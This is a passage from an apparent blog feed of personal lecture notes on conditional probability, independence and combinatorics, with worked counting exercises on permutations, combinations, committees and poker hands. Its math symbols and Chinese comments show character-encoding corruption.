class="table-container"><table><thead><tr><th>(n)</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th></tr></thead><tbody><tr><td>â€”-</td><td>2</td><td>3</td><td>5</td><td>8</td><td>13</td><td>21</td><td>34</td><td>55</td></tr><tr><td>fabonacci</td><td>0</td><td>1</td><td>1</td><td>2</td><td>3</td><td>5</td><td>8</td><td>13</td></tr><tr><td>$\frac{1}{\sqrt{5}}(\frac{\sqrt{5}+1}{2})^{n+1}$</td><td>1</td><td>1</td><td>2</td><td>3</td><td>5</td><td>8</td><td>13</td><td>21</td></tr></tbody></table></div><h1 id="Conditional-Probability"><a href="#Conditional-Probability" class="headerlink" title="Conditional Probability"></a>Conditional Probability</h1><h2 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition"></a>Definition</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-00-45.png" alt></p><h2 id="Conditional-probability-in-uniform-distributions"><a href="#Conditional-probability-in-uniform-distributions" class="headerlink" title="Conditional probability in uniform distributions"></a>Conditional probability in uniform distributions</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-04-13.png" alt></p><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-02-33.png" alt></p><h2 id="Some-General-Rules"><a href="#Some-General-Rules" class="headerlink" title="Some General Rules"></a>Some General Rules</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-09-01.png" alt></p><h3 id="example-1"><a href="#example-1" class="headerlink" title="example 1"></a>example 1</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-10-40.png" alt></p><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-11-05.png" alt></p><h3 id="example-2"><a href="#example-2" class="headerlink" title="example 2"></a>example 2</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-11-27.png" alt></p><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-11-39.png" alt></p><h3 id="example-3"><a href="#example-3" class="headerlink" title="example 3"></a>example 3</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-12-39.png" alt></p><h3 id="example-4"><a href="#example-4" class="headerlink" title="example 4"></a>example 4</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-12-54.png" alt></p><h1 id="Independence-revisited-â€”-Stochastic-Independence-again"><a href="#Independence-revisited-â€”-Stochastic-Independence-again" class="headerlink" title="Independence, revisited â€” Stochastic Independence, again"></a>Independence, revisited â€” Stochastic Independence, again</h1><h2 id="Definition-2"><a href="#Definition-2" class="headerlink" title="Definition"></a>Definition</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-13-46.png" alt></p><p>Using independence to simplify calculations</p><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-14-29.png" alt></p><h2 id="exercise-1"><a href="#exercise-1" class="headerlink" title="exercise 1"></a>exercise 1</h2><p>åªè¦äº¤é›†æ¦‚ç‡ä¸æ˜¯ä¸¤è€…ä¹˜ç§¯ï¼Œå°±è¯´æ˜ä¸æ˜¯äº’ç›¸ç‹¬ç«‹</p><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-15-02.png" alt></p><h2 id="exercise-2"><a href="#exercise-2" class="headerlink" title="exercise 2"></a>exercise 2</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-17-14.png" alt></p><h2 id="exercise-3"><a href="#exercise-3" class="headerlink" title="exercise 3"></a>exercise 3</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-17-31.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Combinatorics</title>
      <link href="/2024/11/18/Math/Combinatorics/"/>
      <url>/2024/11/18/Math/Combinatorics/</url>
      
        <content type="html"><![CDATA[<p>Lecture 13: Combinatorics</p><ul><li><a href="#combinatorics-in-computer-science">Combinatorics in Computer Science</a></li><li><a href="#counting-principles">Counting Principles</a><ul><li><a href="#basic-counting-rules-principles">Basic Counting Rules: Principles</a></li></ul></li><li><a href="#basic-counting-rules-union">Basic Counting Rules: Union</a><ul><li><a href="#example">Example</a></li><li><a href="#consequences-of-the-union-rule">Consequences of the Union Rule</a><ul><li><a href="#fact">Fact</a></li><li><a href="#fact-1">Fact</a></li><li><a href="#proof">Proof</a></li><li><a href="#exercises">Exercises</a></li></ul></li></ul></li><li><a href="#basic-counting-rules-product">Basic Counting Rules: Product</a><ul><li><a href="#the-product-rule">The Product Rule</a><ul><li><a href="#example-1">Example</a></li></ul></li><li><a href="#product-rule-sequences-of-selections">Product rule: Sequences of selections</a><ul><li><a href="#example-2">Example</a></li></ul></li><li><a href="#exercises-1">Exercises 1</a></li><li><a href="#exercises-2">Exercises 2</a></li></ul></li><li><a href="#combinatorial-symmetry">Combinatorial Symmetry</a><ul><li><a href="#definition">Definition</a></li><li><a href="#take-notice">Take Notice</a></li><li><a href="#product-rule-symmetries-and-duplications">Product rule: Symmetries and duplications</a></li><li><a href="#example-3">Example</a></li><li><a href="#product-rule-symmetries-and-duplications-1">Product rule: Symmetries and duplications</a><ul><li><a href="#example-4">Example</a></li></ul></li></ul></li><li><a href="#combinations-and-permutations">Combinations and Permutations</a><ul><li><a href="#permutations-with-duplicates">Permutations with duplicates</a><ul><li><a href="#example-1">Example 1</a></li><li><a href="#example-2">Example 2</a></li></ul></li><li><a href="#r-selections-or-r-combinations">r-selections (or: r-combinations)</a></li><li><a href="#simple-counting-problems">Simple Counting Problems</a></li><li><a href="#exercises-choose-to-from-committees">Exercises: choose to from committees</a></li><li><a href="#exercisescounting-poker-hands">Exercises:Counting Poker Hands</a></li><li><a href="#summary">Summary</a></li><li><a href="#balls-in-boxes">â€œBalls in boxesâ€</a></li></ul></li><li><a href="#alternative-techniques">Alternative Techniques</a><ul><li><a href="#example-5">Example</a></li></ul></li><li><a href="#difficult-counting-problems-not-assessed">Difficult Counting Problems (not assessed)</a><ul><li><a href="#using-programs-to-count">Using Programs to Count</a></li><li><a href="#approximate-counting">Approximate Counting</a></li></ul></li></ul><h1 id="Combinatorics-in-Computer-Science"><a href="#Combinatorics-in-Computer-Science" class="headerlink" title="Combinatorics in Computer Science"></a>Combinatorics in Computer Science</h1><p>Informally, combinatorics is the mathematics of counting.</p><p>More formally, combinatorics is about understanding finite systems of discrete objects.</p><p>For example:</p><ul><li>How many different ways are there of getting a flush in poker?</li></ul><p>In computer science, we use combinatorics when:</p><ul><li>Computing cost functions in algorithmic analysis</li><li>Identifying (in-)efficiencies in data management</li><li>Developing effective techniques for enumerating objects</li><li>Probability calculations</li></ul><h1 id="Counting-Principles"><a href="#Counting-Principles" class="headerlink" title="Counting Principles"></a>Counting Principles</h1><p>General idea: find methods, algorithms or precise formulae to count the number of elements in various sets or collections derived, in a structured way, from some basic sets.</p><p>Examples</p><p>Single base set </p><script type="math/tex; mode=display">S = \{s_1,...,s_n\}</script><p>, and $âˆ£Sâˆ£ = n$; find the number of</p><ul><li>all subsets of S</li><li>ordered selections of r different elements of S</li><li>unordered selections of r different elements of S</li><li>selections of r elements from S such that â€¦</li><li>functions $S âŸ¶ S (onto, 1-1)$</li><li>partitions of S into k equivalence classes</li></ul><div class="table-container"><table><thead><tr><th>Starter</th><th>Main Course</th><th>Dessert</th></tr></thead><tbody><tr><td>Soup</td><td>Fish</td><td>Ice-cream</td></tr><tr><td>Bread</td><td>Beef</td><td>Fruit</td></tr><tr><td></td><td>Pork</td><td>Cheese</td></tr><tr><td></td><td>Chicken</td></tr></tbody></table></div><hr><p>How many:</p><ul><li>3 course meals (Starter-Main-Dessert) are possible?</li><li>3 course meals (Any item for each course) are possible?</li><li>3 course meals (Any item, no duplicates) are possible?</li><li>Meals consisting of 3 items (order is unimportant)?</li></ul><p><strong>These problems are translated into these below:</strong></p><p>How many:</p><ul><li>Starter-Main-Dessert?</li></ul><script type="math/tex; mode=display">2 Ã—4Ã—3=24</script><ul><li>Any item for 3 courses?</li></ul><script type="math/tex; mode=display">9 Ã—9Ã—9=729</script><ul><li>Any item, no duplicates, for 3 courses?</li></ul><script type="math/tex; mode=display">9 Ã—8Ã—7=504</script><ul><li>Meals of 3 different items?</li></ul><script type="math/tex; mode=display">504/6 = 84</script><p>Note, why $504/6 = 84$? Because <strong>(order is unimportant)</strong>, and the order of 3 items is $3!=6$. 504 is the number of 3 ordered items, and 84 is the number of 3 unordered items.</p><p>How to understand the <strong>number of 3 ordered items</strong> is $3!=3 \times 2 \times 1=6$? We could think itâ€™s $3 \times 2 \times 1$ of each time we choose the left items, and itâ€™s exactly the <strong>factorial</strong>!</p><hr><h2 id="Basic-Counting-Rules-Principles"><a href="#Basic-Counting-Rules-Principles" class="headerlink" title="Basic Counting Rules: Principles"></a>Basic Counting Rules: Principles</h2><p>Two simple rules:</p><ul><li><strong>Union rule</strong> (â€œorâ€): If $S$ and $T$ are disjoint $âˆ£S âˆªTâˆ£ =âˆ£Sâˆ£+âˆ£Tâˆ£$</li><li><strong>Product rule</strong> (â€œfollowed byâ€): $âˆ£S Ã— Tâˆ£ = âˆ£Sâˆ£ â‹… âˆ£Tâˆ£$</li></ul><p>These cover many examples, though the rule application is not always obvious.</p><p>Common strategies:</p><ul><li>Direct application of the rule</li><li>Relate unknown quantities to known quantities (e.g.  $âˆ£Sâˆ£ +âˆ£Tâˆ£ = âˆ£S âˆªTâˆ£+âˆ£S âˆ©Tâˆ£$)</li><li>Find a bijection to a set that can be counted</li></ul><script type="math/tex; mode=display">âˆ£Sâˆ£ +âˆ£Tâˆ£ = âˆ£S âˆªTâˆ£+âˆ£S âˆ©Tâˆ£</script><h1 id="Basic-Counting-Rules-Union"><a href="#Basic-Counting-Rules-Union" class="headerlink" title="Basic Counting Rules: Union"></a>Basic Counting Rules: Union</h1><p>Union rule â€” S and T <strong>disjoint</strong></p><script type="math/tex; mode=display">âˆ£S âˆªTâˆ£ =âˆ£Sâˆ£+âˆ£Tâˆ£</script><p>$S_1,S_2,â€¦,S_n$ pairwise disjoint ($S_i âˆ© S_j = âˆ… \quad for \quad i â‰  j$)</p><script type="math/tex; mode=display">âˆ£S_1 âˆª... âˆªS_nâˆ£ = âˆ‘âˆ£S_iâˆ£</script><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>How many numbers in $A = [1,2,â€¦,999]$ are divisible by 31 or 41?</p><p>A:</p><script type="math/tex; mode=display">\lfloor 999/31 \rfloor = 32 \text{ numbers are divisible by 31 }\\\lfloor 999/41 \rfloor = 24 \text{ numbers are divisible by 41}\\\text{No number in A divisible by both 31 and 41}\\Hence, 32+24=56 \text{ divisible by 31 and 41}</script><h2 id="Consequences-of-the-Union-Rule"><a href="#Consequences-of-the-Union-Rule" class="headerlink" title="Consequences of the Union Rule"></a>Consequences of the Union Rule</h2><h3 id="Fact"><a href="#Fact" class="headerlink" title="Fact"></a>Fact</h3><p>For any sets X, Y, Z:</p><script type="math/tex; mode=display">âˆ£Y \setminus Xâˆ£ = âˆ£Yâˆ£âˆ’âˆ£X âˆ©Yâˆ£ \\âˆ£X âˆªYâˆ£ = âˆ£Xâˆ£+âˆ£Yâˆ£âˆ’âˆ£X âˆ©Yâˆ£ \\âˆ£X âˆªY âˆªZâˆ£ = âˆ£Xâˆ£+âˆ£Yâˆ£+âˆ£Zâˆ£  âˆ’âˆ£X âˆ©Yâˆ£âˆ’âˆ£Y âˆ©Zâˆ£âˆ’âˆ£Z âˆ©Xâˆ£  +âˆ£X âˆ©Y âˆ©Zâˆ£</script><h3 id="Fact-1"><a href="#Fact-1" class="headerlink" title="Fact"></a>Fact</h3><p>(1) If $âˆ£S âˆªTâˆ£ = âˆ£Sâˆ£+âˆ£Tâˆ£$ then $S$ and $T$ are disjoint</p><p>(2) If $âˆ£â‹ƒ^n<em>{i=1} S_iâˆ£ = âˆ‘^n</em>{i=1} âˆ£S_iâˆ£$ then $S_i$ are pairwise disjoint</p><p>(3) If $âˆ£T \setminus Sâˆ£ = âˆ£Tâˆ£âˆ’âˆ£Sâˆ£$ then $S âŠ† T$</p><p>These properties can serve to identify cases when sets are disjoint </p><p>(resp. one is contained in the other).</p><h3 id="Proof"><a href="#Proof" class="headerlink" title="Proof"></a>Proof</h3><p>We can prove these facts using the inclusion-exclusion identity for two sets. Namely, that $âˆ£S âˆ© Tâˆ£ +âˆ£S âˆªTâˆ£ = âˆ£Sâˆ£+âˆ£Tâˆ£$.</p><p>(1) Suppose âˆ£Sâˆ£ +âˆ£Tâˆ£ = âˆ£S âˆªTâˆ£. Then inclusion-exclusion gives $âˆ£S âˆ©Tâˆ£ =âˆ£Sâˆ£+âˆ£Tâˆ£âˆ’âˆ£S âˆªTâˆ£ =0, so S âˆ©T =âˆ…$.</p><p>(3) Suppose $âˆ£T \setminus Sâˆ£ = âˆ£Tâˆ£âˆ’âˆ£Sâˆ£$. Then inclusion-exclusion gives $âˆ£S âˆ©Tâˆ£ =âˆ£Sâˆ£$, so $S âŠ† T$.</p><h3 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h3><p>Q: 200 people. 150 swim or jog, 85 swim and 60 do both. How many jog?</p><p>A:</p><p>Let S âˆ¶= {people who swim} and J âˆ¶= {people who jog}.</p><p>Then $âˆ£S âˆªJâˆ£ = âˆ£Sâˆ£+âˆ£Jâˆ£âˆ’âˆ£S âˆ©Jâˆ£$; thus $150 = 85+âˆ£Jâˆ£âˆ’60$, hence $âˆ£Jâˆ£ = 125$.</p><p>Note that the answer does not depend on the number of people overall (200).</p><hr><p>Q: (Supp)There are 100 problems, 75 of which are â€˜easyâ€™ and 40 â€˜importantâ€™. Whatâ€™s the smallest possible number of problems that are both easy and important?.</p><p>A:</p><script type="math/tex; mode=display">âˆ£E âˆ©Iâˆ£ = âˆ£Eâˆ£+âˆ£Iâˆ£âˆ’âˆ£EâˆªIâˆ£ = 75+40âˆ’âˆ£EâˆªIâˆ£ â‰¥ 75+40âˆ’100 = 15</script><h1 id="Basic-Counting-Rules-Product"><a href="#Basic-Counting-Rules-Product" class="headerlink" title="Basic Counting Rules: Product"></a>Basic Counting Rules: Product</h1><h2 id="The-Product-Rule"><a href="#The-Product-Rule" class="headerlink" title="The Product Rule"></a>The Product Rule</h2><p><strong>Product rule</strong>:</p><script type="math/tex; mode=display">âˆ£S_1 Ã—... Ã—S_kâˆ£ = âˆ£S_1âˆ£â‹…âˆ£S_2âˆ£â‹¯âˆ£S_kâˆ£ = \prod^k_{i=1}âˆ£S_iâˆ£</script><p>Take Notice</p><p>This counts the number of <strong>sequences</strong> where the first item is from $S_1$, the second is from $S_2$, and so on.</p><p>Sequences mean that itâ€™s an ordered pair.</p><p><strong>Special case of the product rule</strong>: If all $S_i = S$ for all i and $âˆ£Sâˆ£ = m$ then</p><script type="math/tex; mode=display">âˆ£S_1 Ã—S_2 Ã—â‹¯Ã—S_kâˆ£ =âˆ£S Ã—S Ã—â‹¯Ã—Sâˆ£=âˆ£S^kâˆ£=m^k</script><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><p>Let Î£ = {a,b,c,d,e,f,g}.</p><p>Question. How many 5-letter words can we make?</p><script type="math/tex; mode=display">âˆ£Î£ Ã—Î£Ã—Î£Ã—Î£Ã—Î£âˆ£=âˆ£Î£^5âˆ£=âˆ£Î£âˆ£^5 =7^5 =16,807</script><hr><p>Question. How many words with no letter repeated?</p><script type="math/tex; mode=display">7 \times 6 \times 5 \times 4 \times 3 = 2520</script><p>Or firstly choose 5 letters from the 7 letters, and this is a combination. Then arrange the 5 chosen letters.</p><script type="math/tex; mode=display">\binom{7}{5} = \frac{7!}{5!(7-5)!} = \frac{7 \times 6}{2} = 21 \\5! = 120 \\\binom{7}{5} \times 5! = 2520</script><p>Or permutation number:</p><script type="math/tex; mode=display">P(7, 5) = 2520</script><hr><script type="math/tex; mode=display">P(n, k) = \binom{n}{k} \times k!</script><script type="math/tex; mode=display">P(n, k)=\frac{n!}{(n-k)!}</script><script type="math/tex; mode=display">\binom{n}{k} = \frac{n!}{k!(n-k)!}</script><h2 id="Product-rule-Sequences-of-selections"><a href="#Product-rule-Sequences-of-selections" class="headerlink" title="Product rule: Sequences of selections"></a>Product rule: Sequences of selections</h2><p>Question: How can we count sequences when the underlying set changes?</p><p>A:</p><p>To count sequences <strong>without replacement</strong>:</p><ul><li><p>Define an <strong>order</strong> on the whole underlying set</p></li><li><p>Select from $[1,n]$, where n is the size of the â€œremainingâ€ set, and a selection of i represents choosing the i-th element in that set</p></li></ul><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h3><p>Let Î£ = {a,b,c,d,e,f,g}.</p><p>How many 5-letter words with no letter repeated?</p><script type="math/tex; mode=display">\prod^4_{i=0}(âˆ£Î£âˆ£ âˆ’i) = 7â‹…6â‹…5â‹…4â‹…3 = 2,520</script><h2 id="Exercises-1"><a href="#Exercises-1" class="headerlink" title="Exercises 1"></a>Exercises 1</h2><p>S,T finite. How many functions $S âŸ¶ T$ are there?</p><script type="math/tex; mode=display">âˆ£Tâˆ£^{âˆ£Sâˆ£}</script><p>For all in S has the element in T. So itâ€™s $|T| \times |T| \times â€¦ |T| \quad \therefore âˆ£Tâˆ£^{âˆ£Sâˆ£}$</p><h2 id="Exercises-2"><a href="#Exercises-2" class="headerlink" title="Exercises 2"></a>Exercises 2</h2><p>Q:</p><p>$S=[100â€¦999]$, thus $âˆ£Sâˆ£=900$.</p><p>(a) How many numbers in S contain a 3 <strong>or</strong> 7 in their digits?</p><p>(b) How many numbers in S have a 3 <strong>and</strong> a 7?</p><hr><p>A:</p><p>(a) How many numbers in S contain a 3 <strong>or</strong> 7 </p><p>Let $A_3$ = {at least one â€˜3â€™} and $A_7$ = {at least one â€˜7â€™}.  Then </p><script type="math/tex; mode=display">(A_3 âˆªA_7)^c = \{ n âˆˆ [100,999]âˆ¶ \text{ n digits } âˆˆ \{0,1,2,4,5,6,8,9\} \}</script><p>Note that for each number in S, there are 7 choices for the first digit and 8 choices for the later digits. So</p><script type="math/tex; mode=display">(A_3 âˆªA_7)^c = |{1,2,4,5,6,8,9}| \cdot |{0,1,2,4,5,6,8,9}|^2</script><p>Therefore $âˆ£A_3 âˆª A_7âˆ£ = âˆ£Sâˆ£ âˆ’âˆ£(A_3 âˆªA_7)^câˆ£ = 900âˆ’448 = 452$.</p><p>(b) How many numbers in S have a 3 <strong>and</strong> a 7?</p><script type="math/tex; mode=display">âˆ£A_3 âˆ©A_7âˆ£ = âˆ£A_3âˆ£+âˆ£A_7âˆ£âˆ’âˆ£A_3 âˆªA_7âˆ£ \\ = (900âˆ’8â‹…9â‹…9)+(900âˆ’8â‹…9â‹…9)âˆ’452 \\= 2â‹…252âˆ’452 = 52</script><h1 id="Combinatorial-Symmetry"><a href="#Combinatorial-Symmetry" class="headerlink" title="Combinatorial Symmetry"></a>Combinatorial Symmetry</h1><p>A <strong>symmetry</strong> of a mathematical object is a <strong>bijective</strong> mapping from the object to itself which preserves â€œstructureâ€.</p><p>A <strong>(combinatorial) symmetry</strong> defines an equivalence relation where the equivalence classes all have the same size.</p><p>We are often interested in counting a set â€œup to symmetryâ€. That is, counting the number of equivalence classes.</p><p>This can also be stated as a constraint that identifies a specific item in each equivalence class (<strong>symmetric constraint</strong>).</p><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>A <strong>k-to-1 function</strong> is a function that maps exactly k inputs to an output.</p><h2 id="Take-Notice"><a href="#Take-Notice" class="headerlink" title="Take Notice"></a>Take Notice</h2><p>A <strong>k-to-1 function</strong> defines the equivalence relation of a combinatorial symmetry and vice-versa.</p><h2 id="Product-rule-Symmetries-and-duplications"><a href="#Product-rule-Symmetries-and-duplications" class="headerlink" title="Product rule: Symmetries and duplications"></a>Product rule: Symmetries and duplications</h2><p>Question</p><ul><li>How can we count sequences when we have symmetric<br>constraints?</li><li>How can we count sequences when we have duplicates?</li></ul><h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example"></a>Example</h2><p>Let <strong>Î£ = {a,b,c,d,e}</strong>.</p><ul><li>How many 5-letter words with no letter repeated and a before b before c?</li><li>How many 5-letter words can be made from <em>a,a,a,d,e</em>?</li></ul><p><strong>Take Notice</strong></p><p>The answer will be the same.</p><p>Jiaojiaoâ€™s solution:</p><script type="math/tex; mode=display">5*4 = 20</script><p>and for the second question, we just consider the d and e, and itâ€™s equivalent to the first question.</p><p>My stupid and slow solution:</p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-13-10-25.png" alt></p><p>Hence 2*10 = 20</p><h2 id="Product-rule-Symmetries-and-duplications-1"><a href="#Product-rule-Symmetries-and-duplications-1" class="headerlink" title="Product rule: Symmetries and duplications"></a>Product rule: Symmetries and duplications</h2><script type="math/tex; mode=display">S_1 = \{\text{ accounting for symmetry }\}, \\ S_2 = \{ \text{ symmetries }\}, \\ S =\{\text{ sequences without symmetry }\}</script><script type="math/tex; mode=display">S =S_1Ã—S_2,</script><p>so</p><script type="math/tex; mode=display">âˆ£S1âˆ£ = âˆ£Sâˆ£/âˆ£S2âˆ£</script><p>Alternatively, $\frac{1}{âˆ£S_2âˆ£}$ of the $âˆ£Sâˆ£$ sequences meet the symmetric constraint.</p><h3 id="Example-4"><a href="#Example-4" class="headerlink" title="Example"></a>Example</h3><p><strong>Question</strong>. Let <strong>Î£ = {a,b,c,d,e}</strong>. How many 5-letter words with no letter repeated and a before b before c?</p><p><strong>Answer</strong></p><p>Let Î£â€² = {a,b,c}. Then</p><script type="math/tex; mode=display">âˆ£Sâˆ£ = âˆ£\{\text{ 5 letter words using letters from Î£ with no repeats }\}âˆ£ \\= \prod^4_{i=0}(âˆ£Î£âˆ£ âˆ’i) = 5â‹…4â‹…3â‹…2â‹…1 = 120</script><p>and</p><script type="math/tex; mode=display">âˆ£S_2âˆ£ = âˆ£\{ \text{ orderings of elements in Î£â€² }\}âˆ£ \\ = \prod^2_{i=0}(âˆ£Î£â€²âˆ£ âˆ’i)= 3â‹…2â‹…1 = 6</script><p>So</p><script type="math/tex; mode=display">âˆ£S_1âˆ£ = âˆ£\{ \text{ words in S containing a,b,c in order }\}âˆ£ = \frac{120}{6} = 20</script><h1 id="Combinations-and-Permutations"><a href="#Combinations-and-Permutations" class="headerlink" title="Combinations and Permutations"></a>Combinations and Permutations</h1><p>Combinatorial Objects: How Many?</p><p><strong>permutations</strong></p><p><strong>Ordering</strong> of all objects from a set S; equivalently: Selecting all objects while recognising the <strong>order</strong> of selection.</p><p>The number of permutations of n elements is</p><script type="math/tex; mode=display">n! = nâ‹…(nâˆ’1) ... 1, \\0! =1! =1</script><p><strong>r-permutations (sequences without repetition)</strong></p><p>Selecting any r objects from a set S of size n without repetition while recognising the <strong>order</strong> of selection.</p><p>Their number is</p><script type="math/tex; mode=display">(n)_r = {}^n P_r =  nâ‹…(nâˆ’1)â‹¯(nâˆ’r +1) = \frac{n!}{(n-r)!}</script><h2 id="Permutations-with-duplicates"><a href="#Permutations-with-duplicates" class="headerlink" title="Permutations with duplicates"></a>Permutations with duplicates</h2><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><p>Q: How many anagrams of ASSESS? Namely $\Sigma$={A,S,S,E,S,S}, and what is the number to permutate them?</p><p>A:</p><p>Label Sâ€™s: $AS_1S_2ES_3S_4: 6!$</p><p>In each anagram we can label the Sâ€™s in 4! ways.</p><p>Suppose there are m anagrams. So $m â‹…4!=6!$, i.e. $m=\frac{6!}{4!}$</p><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><p>Number of anagrams of MISSISSIPPI?</p><script type="math/tex; mode=display">\frac{11!}{4!4!2!}</script><h2 id="r-selections-or-r-combinations"><a href="#r-selections-or-r-combinations" class="headerlink" title="r-selections (or: r-combinations)"></a>r-selections (or: r-combinations)</h2><p><strong>Collecting</strong> any r distinct objects without repetition; equivalently: selecting r objects from a set S of size n and <strong>not recognising the order</strong> of selection.</p><script type="math/tex; mode=display">\binom{n}{r} = \frac{(n)_r}{r!} = \frac{n!}{(n-r)!r!} = \frac{n(n-1)...(n-r+1)}{1 \cdot 2 \dots r}</script><p>Take Notice</p><p>These numbers are usually called binomial coefficients due to</p><script type="math/tex; mode=display">(a+b)^n = a^n + \binom{n}{1}a^{n-1}b + \binom{n}{2}a^{n-2}b^{2} + \dots + b^n = \Sigma^n_{i=0} \binom{n}{i}a^{n-i}b^i</script><p>Also defined for any $\alpha \in \mathbb{R}$ as $\binom{\alpha}{r}=\frac{\alpha(\alpha-1)â€¦(\alpha-r+1)}{r!}$</p><h2 id="Simple-Counting-Problems"><a href="#Simple-Counting-Problems" class="headerlink" title="Simple Counting Problems"></a>Simple Counting Problems</h2><p>Give an example of acounting problem whose answer is</p><p>(a) $(26)_{10}$</p><p>(b) $\binom{26}{10}$</p><p>Draw 10 cards from a half deck (eg. black cards only)</p><p>(a) the cards are recorded in the order of appearance</p><p>(b) only the complete draw is recorded</p><hr><p>Examples</p><p>Number of diagonals in a convex polygon</p><p>Number of poker hands</p><p>Decisions in games, lotteries etc.</p><h2 id="Exercises-choose-to-from-committees"><a href="#Exercises-choose-to-from-committees" class="headerlink" title="Exercises: choose to from committees"></a>Exercises: choose to from committees</h2><p>From a group of 12 men and 16 women, how many committees can be chosen consisting of</p><p>(a) 7 members?</p><p>$\binom{12+16}{7}$</p><p>(b) 3 men and 4 women?</p><p>$\binom{12}{3}\binom{16}{4}$</p><p>(c) 7 women or 7 men?</p><p>$\binom{12}{7} + \binom{16}{7}$</p><p>As above,but any 4 people (male or female) out of 9 and two, Alice and Bob, unwilling to serve on the same committee.</p><p>Method 1:</p><p>Firstly, choose 4 people from 9 people. Secondly, consider Alice and Bob are in one committee, so 7 people remained, choose 2 more people from these 7 people, and could form a committee with Alice and Bob.</p><script type="math/tex; mode=display">{all committees} âˆ’ {committees with both A and B} = \binom{9}{4} - \binom{7}{2} = 126 âˆ’21 = 105</script><p>Method 2:</p><p>equivalently, {A in, B out} + {A out, B in} + {none in} = $\binom{7}{3}+\binom{7}{3}+\binom{7}{4}$ = 35 +35+35 = 105</p><h2 id="Exercises-Counting-Poker-Hands"><a href="#Exercises-Counting-Poker-Hands" class="headerlink" title="Exercises:Counting Poker Hands"></a>Exercises:Counting Poker Hands</h2><p>A poker hand consists of 5 cards drawn without replacement from a standard deck of 52 cards</p><p>{A,2-10,J,Q,K} Ã—{club â™£,spade â™ ,heart â™¥,diamond â™¦}</p><p>(a) Number of â€œ4 of a kindâ€ hands (e.g. 4 Jacks)</p><p>âˆ£rank of the 4-of-a-kindâˆ£ â‹… âˆ£any other cardâˆ£ = 13 â‹… (52 âˆ’ 4)</p><p>è¿™é‡Œé—®çš„æ˜¯å‡ ç§ç»„åˆï¼Œæ‰€ä»¥13æ˜¯A-&gt;Kçš„åŒç‚¹æ•°ä¹‹ä¸€ï¼Œç„¶åå› ä¸ºä¸€æ‰‹5ä¸ªç‰Œè¿˜å·®ä¸€ä¸ªï¼Œå› æ­¤ä»(52-4)ä¸­éšä¾¿é€‰ä¸€ä¸ªç‰Œã€‚</p><p>(b) Number of non-straight flushes, i.e. all ards of same suit but not consecutive (e.g. 8,9,10,J,K)</p><p>âˆ£all flushâˆ£ âˆ’ âˆ£straight flushâˆ£ = âˆ£suitâˆ£â‹…âˆ£5-hand in a given suitâˆ£ âˆ’ âˆ£suitâˆ£ â‹… âˆ£rank of a straight flush in a given suitâˆ£  = $4 \cdot \binom{13}{5} - 4 \cdot 10$</p><p>åœ¨é—®éé¡ºå­ä½†åŒèŠ±çš„ç»„åˆï¼Œ4ä¸ªèŠ±è‰²ä¹˜13ï¼ˆåŒèŠ±ï¼‰ä¸­æŠ½5å¼ ï¼ˆåŒèŠ±ç‰Œçš„æ•°é‡ï¼‰ï¼Œå‡å»é¡ºå­åŒèŠ±ï¼šè¿™ç§æƒ…å†µæœ‰10ç§å¯èƒ½çš„é¡ºå­ï¼ˆä» A, 2, 3, 4, 5 åˆ° 10, J, Q, K, Aï¼‰ï¼Œå› æ­¤é¡ºå­åŒèŠ±æ˜¯$4 \cdot 10$. æ•…æœ€ç»ˆç»“æœæ˜¯ä»¥ä¸Šä¸¤é¡¹ç›¸å‡ã€‚</p><p>æ³¨æ„ï¼ŒAåœ¨â€œA2345â€å’Œâ€œ10 JQKAâ€éƒ½å¯ä»¥æ˜¯åŒèŠ±é¡ºï¼Œæ‰€ä»¥åŒèŠ±æƒ…å†µä¸‹ï¼Œåº”è¯¥æ˜¯10ä¸ªæƒ…å†µè€Œä¸æ˜¯9ä¸ªæƒ…å†µã€‚</p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-39-24.png" alt></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-41-30.png" alt></p><h2 id="â€œBalls-in-boxesâ€"><a href="#â€œBalls-in-boxesâ€" class="headerlink" title="â€œBalls in boxesâ€"></a>â€œBalls in boxesâ€</h2><p>Have n â€œdistinguishableâ€ boxes.</p><p>Have k balls which are either:</p><ol><li>Indistinguishable</li><li>Distinguishable</li></ol><p>How many ways to place balls in boxes with</p><ol><li>At most one</li><li>Any number of<br>balls per box</li></ol><p>Take Notice</p><p>Suppose K is a set with $âˆ£Kâˆ£ = k$ and N is a set with $âˆ£Nâˆ£ = n$:</p><ul><li>2A counts the number of injective functions from K to N</li><li>2B counts the number of functions from K to N</li></ul><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-43-40.png" alt></p><h1 id="Alternative-Techniques"><a href="#Alternative-Techniques" class="headerlink" title="Alternative Techniques"></a>Alternative Techniques</h1><p>What if the current techniques are 